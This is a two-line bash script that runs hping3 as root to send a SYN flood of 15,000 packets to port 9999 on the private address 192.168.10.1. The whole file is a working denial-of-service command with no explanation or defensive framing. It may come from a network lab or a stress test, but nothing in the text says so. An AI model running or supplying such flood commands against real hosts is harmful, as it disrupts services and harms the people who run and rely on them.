#!/bin/bash
sudo hping3 -c 15000 -d 120 -S -w 64 -p 9999 --flood 192.168.10.1
